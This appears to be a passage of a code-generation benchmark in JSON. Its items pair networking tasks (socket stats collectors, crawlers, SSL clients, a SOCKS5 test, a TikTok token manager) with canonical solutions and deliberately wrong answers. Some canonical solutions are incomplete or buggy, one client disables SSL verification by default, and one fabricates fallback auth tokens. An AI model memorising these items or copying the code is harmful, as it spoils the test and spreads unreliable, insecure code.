int(server_value)\n                    else:\n                        pools[pool_name][pool_stat] = int(pool_value)\n            else:\n                if stat not in self.IGNORED:\n                    stats[stat] = int(value)\n\n        return stats, pools\n\n    def collect_stats(self, hosts):\n        if isinstance(hosts, basestring):\n            hosts = [hosts]\n\n        results = {}\n        for host in hosts:\n            matches = re.search('((.+)\\@)?([^:]+)(:(\\d+))?', host)\n            alias = matches.group(2) or matches.group(3)\n            hostname = matches.group(3)\n            port = matches.group(5)\n\n            stats, pools = self.get_stats(hostname, port)\n            results[alias] = {\n                'stats': stats,\n                'pools': pools\n            }\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport json\n\nclass TwemproxyStatsCollector:\n    GAUGES = ['uptime', 'curr_connections', 'total_connections', 'cmd_get', 'cmd_set', 'get_hits', 'get_misses', 'delete_hits', 'delete_misses', 'incr_hits', 'incr_misses', 'decr_hits', 'decr_misses', 'cas_hits', 'cas_misses', 'cas_badval', 'auth_cmds', 'auth_errors']\n    IGNORED = ['version', 'pid', 'time', 'pointer_size']\n\n    def get_raw_stats(self, host, port):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((host, port))\n            s.sendall(b'stats\\r\\n')\n            data = b''\n            while True:\n                packet = s.recv(4096)\n                if not packet:\n                    break\n                data += packet\n            return json.loads(data.decode('utf-8'))\n\n    def get_stats(self, host, port):\n        raw_stats = self.get_raw_stats(host, port)\n        general_stats = {}\n        pool_stats = {}\n\n        for key, value in raw_stats.items():\n            if key in self.IGNORED:\n                continue\n            if key in self.GAUGES:\n                general_stats[key] = int(value)\n            elif '.' in key:\n                pool_name, metric = key.split('.', 1)\n                if pool_name not in pool_stats:\n                    pool_stats[pool_name] = {}\n                if metric in self.GAUGES:\n                    pool_stats[pool_name][metric] = int(value)\n                else:\n                    pool_stats[pool_name][metric] = value\n            else:\n                general_stats[key] = value\n\n        return general_stats, pool_stats\n\n    def collect_stats(self, hosts):\n        all_stats = {}\n        for alias, (host, port) in hosts.items():\n            general_stats, pool_stats = self.get_stats(host, port)\n            all_stats[alias] = {\n                'general': general_stats,\n                'pools': pool_stats\n            }\n        return all_stats\n```"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Create a function to crawl content from Weixin Official Account Platform (mp.weixin.qq.com) URLs using HTTP requests with proper error handling and logging.\n\nFunction Description: The function mp_crawler takes a URL and a logger object as input, validates the URL, makes an HTTPS request to the Weixin Official Account Platform, and returns a status code along with response data (empty in case of errors). It includes URL validation, HTTP request handling with timeout, and proper error logging.\n\nInput:\n- url: str - The target URL to crawl (must be from mp.weixin.qq.com domain)\n- logger: logging.Logger - Logger object for recording warnings and errors\n\nOutput:\n- Tuple[int, dict] - Returns a tuple containing:\n  - First element: int status code (-5 for invalid URL, -7 for request failure, or HTTP status code for success)\n  - Second element: dict containing response data (empty dict in case of errors)",
    "Canonical_solution": "import httpx\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nimport re\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'}\n\ndef mp_crawler(url: str, logger) -> (int, dict):\n    if not url.startswith('https://mp.weixin.qq.com') and not url.startswith('http://mp.weixin.qq.com'):\n        logger.warning(f'{url} is not a mp url, you should not use this function')\n        return -5, {}\n\n    url = url.replace(\"http://\", \"https://\", 1)\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nfrom urllib.parse import urlparse\nimport logging\n\ndef mp_crawler(url, logger):\n    # Validate URL\n    parsed_url = urlparse(url)\n    if parsed_url.scheme != 'https' or parsed_url.netloc != 'mp.weixin.qq.com':\n        logger.warning(\"Invalid URL: %s\", url)\n        return -5, {}\n\n    try:\n        # Make HTTP request with timeout\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()  # Raises an HTTPError for bad responses\n        return response.status_code, response.json()\n    except requests.exceptions.HTTPError as http_err:\n        logger.error(\"HTTP error occurred: %s\", http_err)\n        return response.status_code, {}\n    except requests.exceptions.ConnectionError as conn_err:\n        logger.error(\"Connection error occurred: %s\", conn_err)\n        return -7, {}\n    except requests.exceptions.Timeout as timeout_err:\n        logger.error(\"Timeout error occurred: %s\", timeout_err)\n        return -7, {}\n    except requests.exceptions.RequestException as req_err:\n        logger.error(\"An error occurred: %s\", req_err)\n        return -7, {}\n    except ValueError as json_err:\n        logger.error(\"JSON decoding failed: %s\", json_err)\n        return response.status_code, {}"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Create a Python class that interacts with an APC UPS daemon (apcupsd) via TCP socket to collect and process UPS metrics.\n\nClass Description: The ApcupsdCollector class establishes a TCP connection to an apcupsd server, retrieves status information, and processes the raw data into structured metrics. It handles socket communication, data parsing, and metric filtering.\n\nAttributes:\n- config: [dict] - Configuration dictionary containing hostname (str), port (int), and metrics (list of str) to collect\n\nMethods:\n- __init__(hostname='localhost', port=3551, metrics=None) -> None - Initializes the collector with connection parameters and metrics to collect\n- getData() -> str - Establishes TCP connection, sends status request, and returns raw UPS data\n- collect() -> dict - Processes raw data into structured metrics, returning a dictionary of metric_name: value pairs",
    "Canonical_solution": "import socket\nfrom struct import pack\nimport re\nimport time\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.config = {\n            'hostname': hostname,\n            'port': port,\n            'metrics': metrics or ['LINEV', 'LOADPCT', 'BCHARGE', 'TIMELEFT', 'BATTV',\n                                 'NUMXFERS', 'TONBATT', 'MAXLINEV', 'MINLINEV',\n                                 'OUTPUTV', 'ITEMP', 'LINEFREQ', 'CUMONBATT']\n        }\n\n    def getData(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((self.config['hostname'], int(self.config['port'])))\n        s.send(pack('xb6s', 6, 'status'))\n        s.recv(1024)\n        time.sleep(.25)\n        data = s.recv(4096)\n        s.close()\n        return data\n\n    def collect(self):\n        metrics = {}\n        raw = {}\n        data = self.getData()\n        data = data.split('\\n\\x00')\n        \n        for d in data:\n            matches = re.search(\"([A-Z]+)\\s+:\\s+(.*)$\", d)\n            if matches:\n                value = matches.group(2).strip()\n                raw[matches.group(1)] = value\n                vmatch = re.search(\"([0-9.]+)\", value)\n                if not vmatch:\n                    continue\n                try:\n                    value = float(vmatch.group(1))\n                except ValueError:\n                    continue\n                metrics[matches.group(1)] = value\n\n        results = {}\n        for metric in self.config['metrics']:\n            if metric not in metrics:\n                continue\n            metric_name = \"%s.%s\" % (raw['UPSNAME'], metric)\n            value = metrics[metric]\n            results[metric_name] = value\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.config = {\n            'hostname': hostname,\n            'port': port,\n            'metrics': metrics if metrics else []\n        }\n\n    def getData(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.config['hostname'], self.config['port']))\n            s.sendall(b'STATUS\\n')\n            data = s.recv(4096)\n        return data.decode('utf-8')\n\n    def collect(self):\n        raw_data = self.getData()\n        lines = raw_data.splitlines()\n        metrics = {}\n        for line in lines:\n            parts = line.split(': ')\n            if len(parts) == 2:\n                key, value = parts\n                if not self.config['metrics'] or key in self.config['metrics']:\n                    metrics[key] = value\n        return metrics\n```"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Implement a secure TCP client using SSL/TLS for encrypted communication with a server. The client should establish a secure connection, send data, receive responses, and properly close the connection.\n\nFunction Description: The code consists of two functions:\n1. `ssl_client_connect` - Creates and returns an SSL-wrapped socket connected to the specified host and port, with certificate verification\n2. `ssl_client_communicate` - Sends a message through the secure socket, receives the response, and closes the connection\n\nInput:\n- For `ssl_client_connect`:\n  - host: str - The target server's hostname or IP address\n  - port: int - The target server's port number\n  - cert_file: str - Path to the CA certificate file for server verification\n\n- For `ssl_client_communicate`:\n  - ssl_socket: ssl.SSLSocket - The established SSL socket connection\n  - message: bytes - The data to send to the server\n\nOutput:\n- For `ssl_client_connect`: Returns an established SSL socket connection (ssl.SSLSocket)\n- For `ssl_client_communicate`: Returns the server's response as bytes",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\nimport ssl\n\ndef ssl_client_connect(host, port, cert_file):\n    s = socket(AF_INET, SOCK_STREAM)\n    ssl_s = ssl.wrap_socket(s,\n                           cert_reqs=ssl.CERT_REQUIRED,\n                           ca_certs=cert_file)\n    ssl_s.connect((host, port))\n    return ssl_s\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.send(message)\n    resp = ssl_socket.recv(8192)\n    ssl_socket.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\n\ndef ssl_client_connect(host, port, cert_file):\n    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cert_file)\n    context.verify_mode = ssl.CERT_REQUIRED\n    context.check_hostname = True\n    sock = socket.create_connection((host, port))\n    ssl_sock = context.wrap_socket(sock, server_hostname=host)\n    return ssl_sock\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.sendall(message)\n    response = ssl_socket.recv(4096)\n    ssl_socket.close()\n    return response\n```"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Python class that provides TCP socket functionality including connection establishment, data transmission, and SSL support for secure communication.\n\nClass Description: The SocketLibrary class encapsulates TCP socket operations with support for both regular and SSL-wrapped connections. It provides methods to establish connections, send/receive data, and gather connection information.\n\nAttributes: None (This is a utility class without persistent attributes)\n\nMethods:\n\nMethod1: create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]] - Creates and returns a TCP socket connection to the specified host and port. Attempts SSL connection first, falls back to regular TCP if SSL fails. Returns a tuple containing the socket object and SSL flag (True if SSL succeeded).\n\nMethod2: tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection to verify connectivity and returns connection details including peer information, service name, and SSL status without data transmission.\n\nMethod3: tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection, sends test data, receives response, and returns connection details including peer information, service name, response data, and SSL status.",
    "Canonical_solution": "import socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n            ssl_flag = False\n        except ConnectionRefusedError:\n            return None\n\n        try:\n            socket_connection = ssl.wrap_socket(socket_connection)\n            ssl_flag = True\n        except Exception:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n\n        return socket_connection, ssl_flag\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        socket_connection.close()\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(int(port)),\n            \"ssl_flag\": ssl_flag,\n        }\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        try:\n            socket_connection.send(b\"ABC\\x00\\r\\n\\r\\n\\r\\n\" * 10)\n            response = socket_connection.recv(1024 * 1024 * 10)\n            socket_connection.close()\n        except Exception:\n            try:\n                socket_connection.close()\n                response = b\"\"\n            except Exception:\n                response = b\"\"\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(port),\n            \"response\": response.decode(errors=\"ignore\"),\n            \"ssl_flag\": ssl_flag,\n        }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            context = ssl.create_default_context()\n            sock = socket.create_connection((host, port), timeout)\n            sock = context.wrap_socket(sock, server_hostname=host)\n            return sock, True\n        except ssl.SSLError:\n            pass\n        except Exception as e:\n            print(f\"Failed to create SSL socket: {e}\")\n            return None\n        \n        try:\n            sock = socket.create_connection((host, port), timeout)\n            return sock, False\n        except Exception as e:\n            print(f\"Failed to create TCP socket: {e}\")\n            return None\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        result = {}\n        sock, is_ssl = self.create_tcp_socket(host, port, timeout)\n        if not sock:\n            return None\n        \n        try:\n            result['peer_info'] = sock.getpeername()\n            result['service_name'] = socket.getservbyport(port)\n            result['ssl_status'] = is_ssl\n            return result\n        finally:\n            sock.close()\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        result = {}\n        sock, is_ssl = self.create_tcp_socket(host, port, timeout)\n        if not sock:\n            return None\n        \n        try:\n            result['peer_info'] = sock.getpeername()\n            result['service_name'] = socket.getservbyport(port)\n            result['ssl_status'] = is_ssl\n            \n            test_data = b'Hello, Server!'\n            sock.sendall(test_data)\n            response = sock.recv(1024)\n            result['response_data'] = response.decode('utf-8')\n            return result\n        finally:\n            sock.close()\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport requests\nimport httpx\nfrom typing import Optional, Tuple, Dict\n\nclass HTTPClient:\n    def __init__(self, headers: Dict[str, str] = None, verify: bool = False):\n        self.headers = headers if headers else {'User-Agent': 'HTTPClient'}\n        self.verify = verify\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        try:\n            response = requests.get(url, headers=self.headers, verify=self.verify)\n            response.raise_for_status()\n            title = response.text.split('<title>')[1].split('</title>')[0]\n            return title, url\n        except Exception:\n            return None\n\n    def get_request(self, url: str, params: Dict[str, str] = None) -> requests.Response:\n        return requests.get(url, headers=self.headers, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        return httpx.get(url, headers=self.headers, verify=self.verify)\n```"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Write a Python function that tests command responses from a Kamstrup management server by sending specific commands and verifying the responses against expected values.\n\nFunction Description: The function establishes a TCP connection to a Kamstrup management server, sends a help command and a specific packet command, then verifies if the responses match the expected values from a predefined response dictionary. The function returns True only if both responses match their expected values.\n\nInput:\n- packet_type: [str] - The key used to look up the expected response in the RESPONSES dictionary for the packet command.\n- help_msg_command: [bytes] - The byte string representing the help command to be sent to the server.\n- packet_msg_command: [bytes] - The byte string representing the packet command to be sent to the server.\n- kamstrup_management_server: [object] - An object containing the server's connection details, specifically the server port.\n\nOutput:\n- [bool] - Returns True if both the help command response and packet command response match their expected values in the RESPONSES dictionary, otherwise returns False.",
    "Canonical_solution": "from gevent import socket\nfrom conpot.tests.data.kamstrup_management_data import RESPONSES\n\ndef check_command_resp_help_message(\n    packet_type, help_msg_command, packet_msg_command, kamstrup_management_server\n):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"127.0.0.1\", kamstrup_management_server.server.server_port))\n    _ = s.recv(1024)  # receive the banner\n    s.sendall(help_msg_command)  # test the help command\n    help_data = s.recv(1024)\n    help_response = help_data == RESPONSES[\"H\"][packet_type]\n    s.sendall(packet_msg_command)\n    pkt_data = s.recv(1024)\n    packet_resp = pkt_data == RESPONSES[packet_type]\n    s.close()\n    return help_response and packet_resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef test_command_responses(packet_type, help_msg_command, packet_msg_command, kamstrup_management_server):\n    RESPONSES = {\n        \"help\": b\"Help response from Kamstrup server\",\n        \"packet\": b\"Packet response from Kamstrup server\"\n    }\n    \n    try:\n        # Establish a TCP connection to the Kamstrup management server\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect(('localhost', kamstrup_management_server.server_port))\n            \n            # Send the help command and receive the response\n            s.sendall(help_msg_command)\n            help_response = s.recv(1024)\n            \n            # Send the packet command and receive the response\n            s.sendall(packet_msg_command)\n            packet_response = s.recv(1024)\n            \n            # Verify the responses against the expected values\n            if help_response == RESPONSES[\"help\"] and packet_response == RESPONSES[packet_type]:\n                return True\n            else:\n                return False\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        return False\n```"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Create a Python function that tests TCP connectivity to a target server through a SOCKS5 proxy, sends an HTTP request, and measures the response time.\n\nFunction Description: The function establishes a TCP connection to a specified target server through a SOCKS5 proxy, sends a basic HTTP GET request, verifies the response, and measures the time taken for the entire operation. The function handles connection setup, data transmission, response validation, and cleanup.\n\nInput: None (The target server address 'TARGET' is defined as a module-level constant)\n\nOutput: None (The function prints diagnostic messages and timing information to stdout)",
    "Canonical_solution": "import socket\nimport socks\nimport time\n\nTARGET = \"1.1.1.1\"\n\ndef test_tcp() -> None:\n    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)\n    s.set_proxy(socks.SOCKS5, \"127.0.0.1\", 1080)\n\n    print(f\"TCP - Sending HTTP request to {TARGET}\")\n    start = time.time()\n    s.connect((TARGET, 80))\n    s.send(b\"GET / HTTP/1.1\\r\\nHost: \" + TARGET.encode() + b\"\\r\\n\\r\\n\")\n    data = s.recv(1024)\n    if not data:\n        print(\"No data received\")\n    elif not data.startswith(b\"HTTP/1.1 \"):\n        print(\"Invalid response received\")\n    else:\n        print(\"TCP test passed\")\n    end = time.time()\n    s.close()\n\n    print(f\"Time: {round((end - start) * 1000, 2)} ms\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport socks\nimport time\nimport http.client\n\nTARGET = \"example.com\"\n\ndef test_tcp_through_socks5():\n    # Set up the SOCKS5 proxy\n    socks.set_default_proxy(socks.SOCKS5, \"127.0.0.1\", 9050)\n    socket.socket = socks.socksocket\n\n    start_time = time.time()\n\n    try:\n        # Connect to the target server\n        conn = http.client.HTTPConnection(TARGET, timeout=10)\n        conn.request(\"GET\", \"/\")\n        \n        # Get the response\n        response = conn.getresponse()\n        end_time = time.time()\n        \n        # Print response status and headers\n        print(f\"Response Status: {response.status}\")\n        print(\"Response Headers:\")\n        for header, value in response.getheaders():\n            print(f\"{header}: {value}\")\n        \n        # Measure and print the response time\n        response_time = end_time - start_time\n        print(f\"Response Time: {response_time:.4f} seconds\")\n        \n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n    \n    finally:\n        # Clean up the connection\n        conn.close()\n\nif __name__ == \"__main__\":\n    test_tcp_through_socks5()\n```"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the httpx library to fetch and process content from a given URL, with proper error handling and logging.\n\nFunction Description: The function should make a synchronous HTTP GET request to the specified URL using custom headers, handle potential exceptions, decode the response content using detected encoding, and return the extracted data along with a status code. If the request fails, it should log the error and return an error code with an empty dictionary.\n\nInput:\n- url: str | Path - The target URL to fetch content from\n- logger: logging.Logger - A logger instance for error logging\n\nOutput:\n- Tuple[int, dict] - A tuple containing:\n  - Status code (negative for errors, positive for HTTP status codes)\n  - Dictionary containing extracted data (empty if an error occurs)",
    "Canonical_solution": "import httpx\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'\n}\n\ndef simple_crawler(url: str | Path, logger) -> (int, dict):\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n            rawdata = response.content\n            encoding = chardet.detect(rawdata)['encoding']\n            text = rawdata.decode(encoding)\n        result = extractor.extract(text)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nfrom typing import Union, Tuple, Dict\nfrom pathlib import Path\n\ndef fetch_content(url: Union[str, Path], logger: logging.Logger) -> Tuple[int, Dict]:\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\"\n    }\n    try:\n        response = httpx.get(str(url), headers=headers)\n        response.raise_for_status()\n        content_type = response.headers.get('Content-Type', '')\n        charset = None\n        if 'charset=' in content_type:\n            charset = content_type.split('charset=')[1]\n        data = response.text if charset is None else response.content.decode(charset)\n        return response.status_code, {\"data\": data}\n    except httpx.RequestError as e:\n        logger.error(f\"Request failed: {e}\")\n        return -1, {}\n    except Exception as e:\n        logger.error(f\"An error occurred: {e}\")\n        return -2, {}\n```"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Implement a TokenManager class that handles the generation and management of various TikTok authentication tokens (msToken, ttwid, odin_tt) through HTTP requests using the httpx library.\n\nClass Description: The TokenManager class is responsible for managing TikTok authentication tokens by interacting with TikTok's API endpoints. It reads configuration from a YAML file, handles token generation (both real and fallback tokens), and manages HTTP requests with retries and proxy support.\n\nAttributes:\n- token_conf: [dict] - Configuration for msToken generation including URL, headers, and payload data\n- ttwid_conf: [dict] - Configuration for ttwid generation including URL and request data\n- odin_tt_conf: [dict] - Configuration for odin_tt generation including URL\n- proxies: [dict] - Proxy configuration for HTTP and HTTPS connections\n\nMethods:\n- __init__() -> [None] - Initializes the TokenManager by loading configuration from config.yaml\n- gen_real_msToken() -> [str] - Generates a real msToken by making a POST request to TikTok's API endpoint\n- gen_false_msToken() -> [str] - Generates a fallback msToken with random characters when real token generation fails\n- gen_ttwid(cookie: str) -> [str] - Generates a ttwid by making a POST request with the provided cookie\n- gen_odin_tt() -> [str] - Generates an odin_tt by making a GET request to TikTok's endpoint",
    "Canonical_solution": "import os\nimport json\nimport yaml\nimport httpx\nimport asyncio\nfrom typing import Union\n\nclass TokenManager:\n    def __init__(self):\n        path = os.path.abspath(os.path.dirname(__file__))\n        with open(f\"{path}/config.yaml\", \"r\", encoding=\"utf-8\") as f:\n            config = yaml.safe_load(f)\n        \n        tiktok_manager = config.get(\"TokenManager\").get(\"tiktok\")\n        self.token_conf = tiktok_manager.get(\"msToken\", None)\n        self.ttwid_conf = tiktok_manager.get(\"ttwid\", None)\n        self.odin_tt_conf = tiktok_manager.get(\"odin_tt\", None)\n        proxies_conf = tiktok_manager.get(\"proxies\", None)\n        self.proxies = {\n            \"http://\": proxies_conf.get(\"http\", None),\n            \"https://\": proxies_conf.get(\"https\", None),\n        }\n\n    def gen_real_msToken(self) -> str:\n        payload = json.dumps({\n            \"magic\": self.token_conf[\"magic\"],\n            \"version\": self.token_conf[\"version\"],\n            \"dataType\": self.token_conf[\"dataType\"],\n            \"strData\": self.token_conf[\"strData\"],\n            \"tspFromClient\": get_timestamp(),\n        })\n\n        headers = {\n            \"User-Agent\": self.token_conf[\"User-Agent\"],\n            \"Content-Type\": \"application/json\",\n        }\n\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.token_conf[\"url\"], headers=headers, content=payload\n                )\n                response.raise_for_status()\n                msToken = str(httpx.Cookies(response.cookies).get(\"msToken\"))\n                return msToken\n            except Exception as e:\n                logger.error(f\"\u751f\u6210TikTok msToken API\u9519\u8bef\uff1a{e}\")\n                return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return gen_random_str(146) + \"==\"\n\n    def gen_ttwid(self, cookie: str) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.ttwid_conf[\"url\"],\n                    content=self.ttwid_conf[\"data\"],\n                    headers={\n                        \"Cookie\": cookie,\n                        \"Content-Type\": \"text/plain\",\n                    },\n                )\n                response.raise_for_status()\n                ttwid = httpx.Cookies(response.cookies).get(\"ttwid\")\n                if ttwid is None:\n                    raise APIResponseError(\"ttwid: \u68c0\u67e5\u6ca1\u6709\u901a\u8fc7, \u8bf7\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ttwid\")\n                return ttwid\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.ttwid_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")\n\n    def gen_odin_tt(self) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.get(self.odin_tt_conf[\"url\"])\n                response.raise_for_status()\n                odin_tt = httpx.Cookies(response.cookies).get(\"odin_tt\")\n                if odin_tt is None:\n                    raise APIResponseError(f\"{'odin_tt'} \u5185\u5bb9\u4e0d\u7b26\u5408\u8981\u6c42\")\n                return odin_tt\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.odin_tt_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
